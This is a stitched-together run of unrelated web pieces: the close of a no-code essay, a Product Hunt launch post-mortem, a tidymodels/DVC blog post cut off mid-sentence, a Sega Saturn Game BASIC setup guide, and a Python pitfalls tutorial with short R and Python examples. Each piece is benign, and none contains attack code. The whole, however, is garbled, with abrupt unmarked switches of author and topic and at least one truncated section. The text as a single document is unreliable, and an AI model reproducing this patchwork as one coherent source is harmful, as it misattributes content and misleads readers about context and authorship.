<p>No-code seems to reject a lot of those learnings, for better or worse. I haven’t seen any no-code company or product that allows source control (and I’ve seen many no-code companies, but you’re welcome to prove me wrong.) I have yet to find no-code products that allow for natural construction of abstraction between layers of a no-code workflow. No-code software is also scarily ill-prepared for large scale development: we have software systems being worked on by tens of thousands of engineers – what does it look like for a team of 1000 engineers to be working on a set of thousands of no-code workflows? Chaos.</p>
<blockquote>
<p>Traditional software has learned the abstractions and patterns that make software resilient and adaptable to change and scale. No-code software is not ready for changing constraints nor development scale.</p>
</blockquote>
<p>Despite these limitations, I think no-code has a few niches where making tradeoffs in adaptability and scale allows no-code tools to be much, much better. So, given this, <em>when is no-code useful?</em></p>
<h2 id="1-transitionary-ephemeral-software">1. Transitionary, ephemeral software</h2>
<p>The obvious answer, and one I had before our conversation, was <em>transitionary</em> software, software with <em>a defined lifetime</em>. If your software system has a finite, pre-defined lifetime and team, it doesn’t need to worry about changing constraints or team growth. It just needs to worry about solving a problem well, now.</p>
<p>Lots of software has predictably finite lifetime: a product prototype for an early-stage company, a game or app used as a part of an interactive online ad, a quick sketch or solution to patch a particularly urgent problem in a product, an app built for an event or a conference or a recruiting cycle or a quarterly goal tracker… all of these are projects with a pre-defined, maximum lifetime. They don’t need to last or grow or change – they just need to work now, and by giving up some of the adaptability of software abstractions of code, no-code software benefits from way faster prototyping speed. This is a plus.</p>
<p>I think we see lots of finite-time software in transitions. Transitions from having no product to having a product, in a prototype. Transitions in the process of brainstorming a solution and trying multiple designs. Software with a finite shelf life is a good fit for no-code tools.</p>
<h2 id="2-high-churn-code">2. High-churn code</h2>
<p>There’s another category of software for which long-term maintainability matters little – code with high churn.</p>
<p>By high churn, I mean that requirements are changing almost daily, and very little of the code written today will exist in a month or a quarter’s time. If the code you write today doesn’t have to last and evolve, because something new is going to take its place tomorrow, what matters is the speed to build, not resilience to change.</p>
<p>There’s lots of high-churn code in businesses. Marketing websites and landing pages, data pipelines for analytics, e-commerce storefronts, marketing campaigns, payment portals – requirements for these kinds of solutions change quickly enough that code is constantly being rewritten, and if code needs to <em>be replaced</em> more than it needs to <em>last</em>, no-code tools are a great fit.</p>
<h2 id="avoiding-the-same-mistakes">Avoiding the same mistakes</h2>
<p>I think “no-code” is a misnomer. It leads us to think that no-code software is the start of a trend in which general software will involve less coding, and software engineering will become easier. This is not the case. Software engineering is not about building solutions, it’s about evolving them. But change resiliency over time is not the focus of no-code tools, and I think that’s ok.</p>
<p>I think no-code tools are instead an extension of a different trend: <a href="https://thesephist.com/posts/text/">reifying workflows</a>. Business processes and workflows used to be documented in Word docs strewn about the office or on a shared folder, or even just passed down by oral tradition in companies. Now, we have tools that allow us to build these workflows, talk about them, edit them, and share them more concretely. This is a huge boon for more repeatable business processes and for getting things done quickly! I think this is the true win of no-code tools: concretizing workflows.</p>
<p>If no-code wants to be a serious competitor against “traditional” software – though I don’t think it should try – no-code needs to learn from the mistakes of early software. No-code tools need to understand that products and software systems need to live on for decades against changing teams and requirements, and against products and companies and standards that die out and get replaced. This requires a cultural shift, a tooling shift, and a new class of abstractions in our toolbelt as no-code engineers. Anytime we try to introduce more tooling and abstraction to no-code, I think no-code gets just a little more “code” in it. And perhaps that’ll bring us right back to where we started, discovering that code is good.</p>
<p>After all, the world is complex. And when we build software against the complexity of the world, that <a href="https://thesephist.com/posts/complexity-conservation/">complexity needs to go somewhere</a>. Software is complex, but only as much as the world it attempts to make sense of.</p>
<p>It feels like we’re getting off the edge of a discovery phase of no-code, and into a time when we’re starting to understand what problems no-code tools are great for. I think it’s important that no-code tool builders focus on those strengths, or risk falling into the trap of repeating the software industry’s mistakes from the ground up.</p>

<h2>OfferMarket launched today on Product Hunt, and we failed miserably.</h2>

<div><p>
We tried launching on Product Hunt today, if that's what you'll call it. We half-assed it. We put together our launch post and asked a few friends to upvote.&nbsp;<span>6 hours in and we have 3 referrals to our site from Product Hunt.</span></p><p>

One person we asked for an upvote replied "I just like sold my soul to give you an upvote", here's what they were referring to in the sign up with Twitter authentication flow:
</p></div>

<div>
<div>
<p><a><img src="https://www.offermarket.us/uploads/1/3/1/0/131040874/published/twitter-authorize-an-application-copy.jpg?1603845762" alt="Picture"></a></p>
</div>
</div>



<p>
Then we tried to have some people find us on Product Hunt, but they couldn't because their search doesn't work...<br>
</p>

<div>
<div>
<p><a><img src="https://www.offermarket.us/uploads/1/3/1/0/131040874/published/producthunt-offermarket-search-no-results.png?1603845954" alt="Picture"></a></p>
</div>
</div>



<div><p>
So that's when we realized we probably were not going to be raising much awareness on Product Hunt this time around. It also made it clear that Product Hunt either has some bugs or performance issues, or the only people whose product launches percolate to the top of the daily rankings do one or both of the following:</p><ul>
<li>know a lot of people already on Product Hunt and build a following on Product Hunt before launch</li>

<li>coerce a lot of friends, family and others for upvotes</li>
</ul><p>
Which doesn't lend much credibility to the platform as a utility for finding valuable tools.</p><p>

Moving on then. We'll try again next time. We hope you enjoyed our post-mortem and how not to launch on Product Hunt.

October 27, 2020 | https://loppsided.blog/posts/2020-10-26-tidymodels-dvc-mashup/ | <a href="https://web.archive.org/web/*/https://loppsided.blog/posts/2020-10-26-tidymodels-dvc-mashup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I had a few goals in my first few days of vacation:</p>
<ol type="1">
<li>Figure out GitHub Actions.</li>
<li>Try out <a href="https://tidymodels.org/"><code>tidymodels</code></a> , after being inspired by a R in Pharma talk on the <code>stacks</code> package.</li>
<li>Investigate this whole MLOps thing, and by investigate I meant <em>try it</em>, I did NOT go on vacation to read more Gartner Garbage ™️ .</li>
</ol>
<p>As luck would have it, <a href="https://twitter.com/DrElleOBrien">@DrElleOBrien</a> happened to reach out about trying <a href="https://twitter.com/DrElleOBrien">DVC</a> with R. DVC is a framework for MLOps that can use GitHub actions, so I had the perfect excuse to knock out all three goals with one sample project.</p>
<p>If you don’t want the rambling story, here is the project: <a href="https://github.com/slopp/tidydvc">https://github.com/slopp/tidydvc</a>.</p>
<h2 id="background">Background</h2>
<h3 id="dvc">DVC</h3>
<p><a href="https://dvc.org/">DVC</a>, and its close companion <a href="https://cml.dev/">CML</a>, provide tools for model management - think Git for data and models. The core idea is that a DVC pipeline tracks the input (files, data, hyper-parameters) to an experiment and the output of an experiment (model, metrics, etc). DVC can be used locally, but the real magic is that DVC can be combined with something like GitHub and GitHub actions to automate the experiment management. Just like a software engineer could create a PR to propose a change to code, a data scientist could create a PR to propose a change to a model. But, unlike in software engineering where the goal of a PR is to review and automatically test code changes, in ModelOps the goal of the PR would be to train a model and explain the outcome!</p>
<p>DVC is primarily built around Python, but I wanted to see if it could be used with R. In many ways it shares some of the principles of the <code>drake</code> (now <code>targets</code>) package, but with some added Git ✨.</p>
<h3 id="tidymodels">Tidymodels</h3>
<p><a href="https://tidymodels.org/">Tidymodels</a> is an opinionated workflow for model construction in R<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a>. It is kind of like scikit learn in the sense that many different algorithms are presented with a consistent interface.</p>
<p>A few interesting bits about tidymodels:</p>
<ol type="1">
<li>There is a concept of a <code>workflow</code> that allows you to track a model’s pre-processing steps and the model itself in one easy-to-use object. This turns out to be super helpful, though a bit at odds with DVC (or drake)’s concept of a pipeline… more to come.</li>
<li>There are easy ways to <code>tune</code> hyper-parameters. Again, very helpful, but potentially at odds with external ModelOps-y things that want to control those elements.</li>
<li>There is experimental support for <a href="https://github.com/tidymodels/stacks">ensembles</a>, which is what I wanted to try!</li>
</ol>
<p><img src="https://loppsided.blog/posts/2020-10-26-tidymodels-dvc-mashup/images/paste-5761E6A6.png" title="The Delightful stacks Logo" alt="The Delightful stacks Logo"><br>
</p>
<h3 id="mashup">Mashup</h3>
<p>Aside from learning the individual pieces, I wanted to see if it was possible to glue these different ecosystems together. As I hinted at above, however, there were some surface level concerns. It wasn’t clear to me if I could define clean boundaries between the concepts <code>tidymodels</code> wanted to control and what DVC expected to own. But the goal of PRs with beautiful <code>ggplots</code>was enticing. (Famous last words).</p>
<p>Final note, I also enjoy using R Markdown as a framework for data exploration and model creation. I find R Markdown encourages “thinking while coding”. I definitely wanted R Markdown to play a role.</p>
<p>If you are interested in this type of mashup but want to play mostly in R, I highly recommend this article by David Neuzerling: <a href="https://mdneuzerling.com/post/machine-learning-pipelines-with-tidymodels-and-targets/">Machine Learning Pipelines with Tidymodels and Targets</a>.</p>
<h2 id="unstacking-stacks">Unstacking Stacks</h2>
<div><p>I began by creating an R Markdown document that roughly followed the outline of this <a href="https://stacks.tidymodels.org/articles/basics.html">stacks tutorial</a>. To spice things up, I decided to use the Ames Housing data, so my goal was to create an ensemble that predicted housing prices. You can follow the <a href="https://github.com/slopp/tidydvc/blob/main/fit_model.Rmd">code here</a>. Because one of my goals was to try tidymodels, here are some notes for future me on what I learned.</p></div>
<h3 id="dont-skip-eda">Don’t skip EDA</h3>
<p>I didn’t want to just copy code from Max’s <a href="https://www.tidymodels.org/learn/models/parsnip-ranger-glmnet/">parsnip regression tutorial</a> so instead I opted to write my own formula regressing on different predictors<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a>. I thought I could do this without any EDA. MISTAKE. I lost at least 2 hours fighting models that wouldn’t converge because my data was either incomplete or my pre-processing was non-sensical. I still am not happy with the results, but I did learn a valuable tactic. <em>When defining a recipe that will be used further down the line in a workflow, it is still a good idea (though not required) to prep and juice the recipe.</em> Essentially, this optional juicing allows you to SEE how the recipe is applied to your training dataset and troubleshoot any errors in a friendly space, as opposed to an unfriendly space (which is what I call a stack trace from the middle of a cross validation optimization routine that has failed because of a <code>NA</code>).</p>
<div data-layout="l-body">
<pre><code>
# First define the recipe
housing_rec &lt;- recipe(SalePrice ~ ...) %&gt;% 
  update_role(PID, new_role = "ID") %&gt;% 
  step_dummy(all_nominal()) %&gt;%  
  step_meanimpute(all_numeric()) %&gt;% 
  step_zv(all_predictors()) %&gt;% 
  step_nzv(all_predictors())

# Check it!
housing_rec %&gt;% 
  prep() %&gt;% 
  juice()

# Then do the rest of your workflow magic
housing_wflow &lt;- 
  workflow() %&gt;% 
  add_recipe(housing_rec)</code></pre>
</div>
<p><em>Tune</em></p>
<p>Tuning is easy. Getting the model out of the tune to actually use… a little less intuitive. As with all things, I should have started by reading <a href="https://juliasilge.com/blog/sf-trees-random-tuning/">Julia Silge’s advice</a>. Essentially there are a couple things you (future me) need to know:</p>
<ol type="1">
<li>You create a model spec and stick it in a workflow:</li>
</ol>
<div data-layout="l-body">
<pre><code>
# PS - for those who learned penalized regression through glmnet
# penalty = lambda 
# mixture = alpha
model_spec &lt;- linear_reg(penalty = tune("penalty"), mixture = tune("mixture"))

# the workflow ties your model to your pre-processing
model_wflow &lt;- 
  workflow() %&gt;% 
  add_recipe(preprocess_data) %&gt;% 
  add_model(model_spec)</code></pre>
</div>
<ol start="2" type="1">
<li>You can tune the model<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> using a grid:</li>
</ol>
<div data-layout="l-body">
<pre><code>
tune_results &lt;- 
  tune_grid(
    model_wflow,
    resamples = folds,  
    metrics = metric,  # think rmse
    control = control_grid() # controls what metadata is saved 
  )</code></pre>
</div>
<ol start="3" type="1">
<li>You can look at the tuned results:</li>
</ol>
<div data-layout="l-body">
<pre><code>
# hint use the n function argument to see more. This is where you can find the actual tune parameters
show_best(tune_results)</code></pre>
</div>
<ol start="4" type="1">
<li>BUT, at this point, <em>you have to finalize the actual best model</em>. Or in the case of an ensemble, you have to finalize <em>many</em> models. Finalize means take the tuned parameters and fit the model on ALL the training data. (The parameters come from a model fit on a cross validation fold). To do this:</li>
</ol>
<div data-layout="l-body">
<pre><code>
# select_best was counterintuitive to me... I found it hard to pull the data
# for all models; and it doesn't give you the best model, just the best
# tune parameters 
tuned_params &lt;- select_best(tune_results)

# use this object for future predictions
model_wflow_fit &lt;- finalize_workflow(model_wflow, tuned_params)

# final tip: to inspect the actual model 
model_wflow_fit %&gt;% 
  pull_workflow_fit() %&gt;% 
  broom::tidy() # linear models OR
  vip::vip() # trees</code></pre>
</div>
<p>At different points of this process it can be easy to forget what is trained and what is still a placeholder. The print methods are really good, use them.</p>
<h3 id="stacks">Stacks</h3>
<p>My final goal was to fit an ensemble model. Unfortunately, I hit an error using the <code>stacks</code> package. I suspect this error was due to the fact that the package is experimental and I had some stale dependencies. This left me between a rock and, well, another rock. I could have tried to nuke my environment and fight with <code>remotes</code> to install a bunch of development tidymodels packages. (This was made harder by the WIP change to <code>main</code> from <code>master</code> 👏). Or I could try to push forward by working around the error with my own ensemble code. I went for the latter path, and refreshed a lot of my statistical thinking along the way. (Recall <code>%*%</code> is how to do matrix multiplication in R). But I also killed 5 hours of vacation. 🤷 I will spare you and my future self the details in the hope that the error is fixed, but a few conceptual tips:</p>
<ol type="1">
<li>The <code>stacks()</code> object starts with candidate models (from <code>tune_grid</code>) or a single model but with multiple fits (from <code>fit_resamples</code>). The magic this function does is align the different models based on the resample they used. In other words, if one candidate was fit on resample 1, it is matched with another candidate fit on resample 1. The same matching occurs within tuning configurations from a single model.<br>
</li>
<li>Under the hood, the ensemble is fit with glmnet, but buried in quite a few layers of tidymodels abstraction. <code>cv.glmnet</code> works as an alternative, but with a nasty side affect. You have to do all the work manually to get a final fitted object that glues all the prior models, workflows, and the ensemble together.<br>
</li>
<li>When those nice print methods I mentioned earlier fail, try <code>attributes</code> to see “all the stuff” tidymodels is carrying around.</li>
</ol>
<h2 id="the-mashup">The Mashup</h2>
<h3 id="adding-dvc">Adding DVC</h3>
<p><br>
Once I had a functional R Markdown document that was fitting models, it was time to try this ModelOps thing. Now ModelOps can consist of a lot of things, but in this case I was interested in trying out the training side of model operations - tracking experiments and enabling collaboration. I’ll save the monitoring side - deploying models to production and watching them overtime - for another vacation.</p>
<div><p>DVC is oriented around pipelines. Unfortunately, this appeared to clash a bit with my R Markdown workflow. For one, the R Markdown document “drove” all the modeling code, and this code was not amenable to being managed by an external pipeline. Another problem was that the tidymodels packages, especially <code>tune</code> and <code>stacks,</code> handled the parameters and “experiments” that DVC wanted to control.</p><p>

I decided to mostly ignore the first challenge. If my data was large, or the pre-processing intense, I think I would have benefited from breaking the R Markdown document into child documents that could each be a stage in a pipeline. In this case, I didn’t care for the extra overhead in saving intermediate results, and things were fast enough that I didn’t mind re-running steps from scratch. As I mentioned, I am advocate for using R Markdown instead of .R files even in the multi-stage approach. You an see an example of this <a href="https://github.com/sol-eng/bike_predict">“split it up” approach here</a>.</p></div>
<p>For the second problem, I decided to go with a hyper-hyper-parameter strategy. Essentially, I allowed <code>tune</code> and tidymodels to handle the hyper-parameter optimization within a model, but I used DVC to handle “parameters” that would …</p></div></div>

<p>Game BASIC for Sega Saturn is a homebrew development kit that allows you to program games for the Sega Saturn using the BASIC programming language.&nbsp; If you’re familiar with the PlayStation’s Net Yaroze platform, think of this as the Saturn’s answer to it – just cheaper and easier to get started with.</p>



<p>Game BASIC’s use of the BASIC language makes for a very low barrier to entry in terms of programming skill.&nbsp; Though the Saturn is notoriously difficult to program for, Game BASIC makes it easy to get started and is surprisingly powerful, allowing very easy sprite manipulation and straightforward 3D polygon implementation.&nbsp; It even includes an adapter cable that allows you to communicate with the Saturn from your PC to transfer or save programs and streamline development.  For example, here’s a Pilotwings-esque demo, but in Game BASIC:</p>

<p>The caveat?&nbsp; Game BASIC was released only in Japan, so this means a complete setup can be difficult to obtain and all documentation is in Japanese!&nbsp; Moreover, the supporting software that allows you to use your PC for streamlined development was intended for the Windows 95 era and flat out does not install on modern systems. Oh, and the adapter cable that allows you to connect your Saturn to your PC is a 25-pin serial connection!</p>



<p>Who in the world still has both Game BASIC and a Windows 95 PC with a physical serial port? Nobody!&nbsp; (Well, unless you’re <a href="https://www.youtube.com/watch?v=O_QU8eaMymo" target="_blank" rel="noreferrer noopener">Modern Vintage Gamer</a>) But if you’re a brave experimenter who’s not afraid to tinker a bit, there are still multiple options to get everything working, even today!&nbsp; You can even do a lot just via emulation.&nbsp; So, let’s head to the Lab and get started…</p>



<h3>What You’ll Need</h3>



<p>There are several options for working with Game BASIC, ranging from quite simple but clunky to work with, to quite powerful and streamlined.&nbsp; Here are the three options:</p>



<h4>The Simple Saturn-only setup</h4>



<h5>Required Tools</h5>



<ul><li>A copy of the <a href="https://archive.org/details/game-basic-for-sega-saturn" target="_blank" rel="noreferrer noopener">Game BASIC for Sega Saturn disc</a></li><li>The ability to play Japanese Saturn games (A Japanese or modded console, a Pro Action Replay/<a href="https://ppcenter.webou.net/pskai/" target="_blank" rel="noreferrer noopener">Pseudo Saturn Kai</a> cartridge, or a Saturn emulator)</li><li>Any Saturn controller</li><li>Plenty of room in the Saturn’s internal memory (if you want to save your programs)</li></ul>



<p>For this option, you’ll run Game BASIC on the Saturn with no PC connection, using only standard Saturn accessories.&nbsp; This is a reasonable choice if you just want to write “Hello, World!”-style programs or play around with the neat games and demos that come with the kit.&nbsp; Theoretically, you can write even the most complex programs this way, but you’ll run into limitations on the size of games you can save to the Saturn’s internal memory.&nbsp; Plus, programming with a virtual keyboard is an absolute pain.&nbsp; Start here if you don’t have the necessary hardware for the other options, or if you just want to poke around a bit and see what this is all about.</p>



<h4>The Enhanced Saturn-only setup</h4>



<h5>Required Tools</h5>



<ul><li>All of the tools from Option 1, PLUS</li><li>Some kind of external expanded memory, such as:<ul><li>A direct-save memory cartridge (e.g., the official Saturn Backup Memory)</li></ul><ul><li>A Sega Saturn Floppy Disk Drive and some 3.5″ floppy disks</li></ul></li><li>A Sega Saturn keyboard OR the NetLink keyboard adapter with a PS/2 keyboard</li><li>Fun peripherals, like the Stunner light gun, 3D Control Pad, multi-tap, and Shuttle Mouse</li></ul>



<p>One of the great things about Game BASIC is how easy it makes it to access the Saturn’s peripherals, including the internal backup RAM, external memory cartridges, and even the Saturn Floppy Disk Drive.&nbsp; With a setup like this, you’ll have plenty of space to save your programs and you can use a real keyboard for text entry.&nbsp; You can even start experimenting with different forms of input, like analog controls and light guns!&nbsp; But without access to the tools a PC provides, it will be difficult to make nice-looking sprites, textures, and 3D models.&nbsp; So, this will still limit what you’re capable of.&nbsp; Regardless, this is a great option for the sheer fun factor of “Hey look! I’m programming with my Saturn!” or if you have no ability to connect your Saturn to a PC.</p>



<p>You can even go this route with a Saturn emulator, giving you easy access to improved keyboard, mouse, and storage options.&nbsp; I’ve confirmed that Mednafen successfully emulates Game BASIC and allows for keyboard and mouse pass-through input, meaning you can do a whole lot of Saturn development with very little barrier to entry.</p>



<h4>The Full Saturn plus PC Setup</h4>



<h5>Required Tools</h5>



<ul><li>A complete Game BASIC for Sega Saturn kit, including:<ul><li>A copy of the <a rel="noreferrer noopener" href="https://archive.org/details/game-basic-for-sega-saturn" target="_blank">Game BASIC for Sega Saturn disc</a></li></ul><ul><li>A copy of the <a rel="noreferrer noopener" href="https://archive.org/details/game-basic-for-sega-saturn" target="_blank">Windows 95 Tools disc</a></li></ul><ul><li>The special Saturn-to-PC serial cable adapter</li></ul></li><li>A modern PC with a USB port, capable of running a Virtual Machine (I use VirtualBox)</li><li>A copy of Windows XP SP3 32-bit to install on a VM</li><li>A <a href="https://www.amazon.com/USB-Serial-Adapter-Prolific-PL-2303/dp/B003WOWBBW" target="_blank" rel="noreferrer noopener">USB-to-Serial adapter</a> (Must support RS232 with a DB25 connector)</li><li>The ability to play Japanese Saturn games on original hardware (Japanese or modded console, or a Pro Action Replay/Pseudo Saturn Kai cartridge)</li><li>A Saturn controller</li><li>Optionally, any fun Saturn accessories you may want to experiment with (I especially recommend a keyboard or keyboard adapter)</li></ul>



<p>This is the Cadillac option!&nbsp; This is the setup I use, is how Game BASIC was really intended to be used (well, except nobody expected it to be run on a VM, I suppose), and is what the rest of this guide will focus on.&nbsp; With this setup, writing a game is as simple as writing BASIC in a text editor and hitting a couple of buttons to send it to your Saturn, where it immediately shows up on your TV and responds to controller and keyboard input!&nbsp; Seriously, it’s super cool once you get it working…</p>



<p>The Simple and Enhanced Saturn-only setups are extremely straightforward.&nbsp; You just boot Game BASIC like any other Saturn game and get started, so there’s not much configuration to discuss.&nbsp; Regardless of the setup you choose, continue on to Part 2 for a few test programs.&nbsp; But if you want the Full setup, it’s quite a project to get going, so read on to Part 3 for the complete How-To!</p>

<p>If the answer is yes, then keep reading. Chances are that if you program in Python, you will probably fall into one of these silly behaviors.</p>
<p>In the part 1 of this series I’m going to show you 5 things that have a great potential drive you mad in Python. Some of them are very subtle and others are not obvious at all. By learning about them in advanced, you can save hours of debugging time. So brace yourself and let’s go!</p>

<p>I confess that this one has costed me several hours of my life. When used correctly it is very nice but when you don’t, it’s a headache.</p>
<p>In Python you can concatenate strings using not only using the <code>+</code> operator but also implicitly. The following snippet illustrates a very common bug in Python.</p>
<pre><code>In [<span>2</span>]: <span>"french "</span> + <span>"bulldog"</span>
Out[<span>2</span>]: <span>'french bulldog'</span>
</code></pre>
<p>That's fine, <code>&lt;string&gt; + &lt;string&gt;</code> generates a new <code>&lt;string&gt;</code>. But what you may not know is that you can leave <code>+</code> out and Python will still concatenate the string.</p>
<pre><code>In [<span>3</span>]: <span>"french "</span> <span>"bulldog"</span>
Out[<span>3</span>]: <span>'french bulldog'</span>
</code></pre>
<p>When is this a problem, then? It'll be an issue when you want a list of strings and forget a comma.</p>
<pre><code>In [<span>4</span>]: dogs = [<span>"poodle"</span> <span>"french bulldog"</span>, <span>"pit bull"</span>, <span>"american bully"</span>]
In [<span>6</span>]: dogs
Out[<span>6</span>]: [<span>'poodlefrench bulldog'</span>, <span>'pit bull'</span>, <span>'american bully'</span>]
</code></pre>
<p>Oh, it can get worse. Imagine you have a function that accepts two strings, but the second one is optional.</p>
<pre><code>In [<span>11</span>]: <span><span>def</span> <span>print_pair</span>(<span>a: str, b: Optional[str] = None</span>):</span>
    ...:     print(<span>"a: "</span>, a, <span>"b: "</span>, b)
In [<span>13</span>]: print_pair(
    ...: <span>"First string"</span>
    ...: <span>"Second string"</span>
    ...: )
a:  First stringSecond string b:  <span>None</span>
</code></pre>
<p>You see? The function runs just fine, so that’s not great! Situations like these can hide nasty bugs. The lesson here is clear: be careful when passing strings to functions or using them as list of items.</p>
<h2 id="walrus-wat">Walrus WAT!?</h2>
<p><img src="https://media.giphy.com/media/cv4aHA3NS4YxO/giphy.gif" alt="A dog playing goes #fail"></p>
<p>In 2019, Python 3.8 introduced the walrus operator. This new feature generated a lot of controversies. Some people loved whereas other actually hated it. The goal of this post is not to debate that, so I’ll dive right into what makes walrus confusing.</p>
<p>Before Python 3.8, you could not assign a value to a variable and test if it was “truthy” in the same statement.  For example, see the following example, of reading data from a socket until an empty string is read. This examples is inspired by  <a target="_blank" href="https://www.python.org/dev/peps/pep-0572/#capturing-condition-values">one</a>  described in the PEP.</p>
<p>Without <code>walrus</code>:</p>
<pre><code>data = sock.recv(<span>4096</span>)
<span>while</span> data:
    clean_data = clean(data)
    print(<span>"Received data:"</span>, data)
    data = sock.recv(<span>4096</span>)
</code></pre>
<p>With <code>walrus</code>:</p>
<pre><code><span>while</span> data := sock.recv(<span>4096</span>):
    clean_data = clean(data)
    print(<span>"Received data:"</span>, data)
</code></pre>
<p>That is, you do both the assignment and the checking in the same line by using <code>:=</code>.</p>
<p>In Python we can use tuples to assign values to more than one variable in the same line.</p>
<pre><code>In [<span>1</span>]: a, b = <span>2</span>, <span>3</span>

In [<span>2</span>]: a
Out[<span>2</span>]: <span>2</span>

In [<span>3</span>]: b
Out[<span>3</span>]: <span>3</span>
</code></pre>
<blockquote>
<p>Hum... we probably can do the same using walrus, right?</p>
</blockquote>
<pre><code>In [<span>4</span>]: (a, b := <span>16</span>, <span>19</span>)
Out[<span>4</span>]: (<span>2</span>, <span>16</span>, <span>19</span>)
</code></pre>

<p>Thanks to  <a target="_blank" href="https://www.reddit.com/user/ForceBru/">@ForceBru</a> who kindly  <a target="_blank" href="https://www.reddit.com/r/Python/comments/jh66bh/how_to_shoot_yourself_in_the_foot_with_python/g9wfoi9/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">corrected me</a>, what gets assigned to <code>b</code> is not a tuple, but only the first element after <code>:=</code>.
As a result, <code>(a, b := 16, 19)</code> is the same as <code>(a, (b := 16), 19)</code>. And that explains why a 3-tuple is returned.</p>
<p>You can verify that by <a target="_blank" href="https://tio.run/##K6gsycjPM7YoKPr/PzO3IL@oRCGxuISLq6AoM69EA8jUSynNLQAzChKLilM1lDQSdRSSrGwVDM10FAwtNZU0NTX//wcA">printing the AST</a> .</p>

<p>When the first variable is not defined, a <code>NameError</code> will be raised. Now you know how to avoid that!</p>
<h2 id="be-careful-when-using-with-lists">Be Careful When Using <code>+=</code> With Lists</h2>
<p><img src="https://media.giphy.com/media/GEObzG7vNeRUs/giphy.gif" alt="A dog falling down the stairs"></p>
<p>Lists in Python are incredibly nice. You can perform all sorts of stuff like:</p>
<ul>
<li>concatenating multiple lists using <code>+</code> operator</li>
<li>generating a repeated list by using the <code>*</code> operator</li>
<li>concatenate and assign lists using <code>+=</code></li>
</ul>
<p>Let’s look at an example on how <code>+</code> operator works with the <code>list</code> object. I know you may be tired of such toy examples, but please, bear with me.</p>
<pre><code>In [<span>20</span>]: lst = [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]

In [<span>21</span>]: lst_copy = lst

In [<span>22</span>]: lst = lst + [<span>8</span>, <span>9</span>]

In [<span>23</span>]: lst
Out[<span>23</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]

In [<span>24</span>]: lst_copy
Out[<span>24</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]
</code></pre>
<p>Cool, we created a list called <code>lst</code> then we built a new one named <code>lst_copy</code> by pointing it to <code>lst</code>. Then we changed <code>lst</code> by appending <code>[8, 9]</code> to it. As expected, the <code>+</code> operator expanded <code>lst</code> whereas <code>lst_copy</code> remained the same.</p>
<p>In Python one can shorten expressions like <code>a = a + 1</code> as <code>a += 1</code>. As I mentioned in the beginning, you can also use the <code>+=</code> operator with lists. So, let’s give it a shot and re-write our example.</p>
<pre><code>In [<span>25</span>]: lst = [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]

In [<span>26</span>]: lst_copy = lst

In [<span>27</span>]: lst += [<span>8</span>, <span>9</span>]

In [<span>28</span>]: lst
Out[<span>28</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]

In [<span>29</span>]: lst_copy
Out[<span>29</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]
</code></pre>
<blockquote>
<p>WAAATTT!? What happened here?</p>
</blockquote>
<p>The reason for this behavior is that, like other Python operators, the implementation of <code>+=</code> is defined by the class that implements it. That is, to define <code>+=</code> the <code>list</code> class has defined a <code>object.__iadd__(self, other)</code> magic method. And the way it works is the same as <code>list.extends</code>. </p>
<p>So why has <code>lst_copy</code> been modified? </p>
<p>Because it is not an actual copy of <code>lst</code> but it points to the in memory.</p>

<p>The key takeaway is, don't blindly assume operators will have the same semantics across different classes. </p>
<h2 id="mutable-defaults">Mutable Defaults</h2>
<p><img src="https://media.giphy.com/media/13cbZDgXa23UeQ/giphy.gif" alt="A dog jumping sofas #fail"></p>
<p>I understand that this one might not be new to you. However, it’s unquestionably one of the most dangerous. The case I’m talking about is the usage of mutable default arguments on functions. If you don’t know what this is all about, take a look at the following example.</p>
<pre><code>In [<span>35</span>]: <span><span>def</span> <span>add_fruit</span>(<span>fruit: str, basket: list = []</span>) -&gt; list:</span>
    ...:     basket.append(fruit)
    ...:     <span>return</span> basket
    ...: 

In [<span>36</span>]: b = add_fruit(<span>"banana"</span>)

In [<span>37</span>]: b
Out[<span>37</span>]: [<span>'banana'</span>]

In [<span>38</span>]: c = add_fruit(<span>"apple"</span>)

In [<span>39</span>]: c
Out[<span>39</span>]: [<span>'banana'</span>, <span>'apple'</span>]
</code></pre>
<blockquote>
<p>WAAATT!?</p>
</blockquote>
<p>As you can see, we call the function twice without passing a list to it. The ultimate result is a list with two items, how did that happen?</p>
<p>The reason for this behavior is that when the interpreter defines the function, it also creates the default argument. Then, it binds the object created to the function argument. </p>
<p>In our problem, Python allocated an empty list and bound it to the argument <code>basket</code>. To make things simpler to follow, let’s look at a visual example made with <a target="_blank" href="http://www.pythontutor.com/">python tutor</a>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603048050068/v39uSktN5.png?auto=format&amp;q=60" alt="mutable-1.png"></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603048076920/D_qYippaU.png?auto=format&amp;q=60" alt="mutable-2.png"></p>
<p>As you can see, the argument <code>basket</code> is created once and the function points to it during its entire lifetime. The only exception is when you pass another list to it but that won’t change the default. Whenever you call the function again without passing a list to it, it will use the one created when the function was defined.</p>
<blockquote>
<p>How can we avoid this, then?</p>

<p>To avoid this, you must set the argument to <code>None</code> and create a list if none is passed.</p>
<pre><code>In [<span>44</span>]: <span><span>def</span> <span>add_fruit</span>(<span>fruit: str, basket: Optional[list] = None</span>):</span>
    ...:     <span>if</span> basket <span>is</span> <span>None</span>:
    ...:         basket = []
    ...:     basket.append(fruit)
    ...:     <span>return</span> basket

In [<span>45</span>]: b = add_fruit(<span>"banana"</span>)

In [<span>46</span>]: b
Out[<span>46</span>]: [<span>'banana'</span>]

In [<span>47</span>]: c = add_fruit(<span>"apple"</span>)

In [<span>48</span>]: c
Out[<span>48</span>]: [<span>'apple'</span>]
</code></pre>
<p>Great! Now we create a list whenever no argument is passed to the function, which fixes the bug.</p>

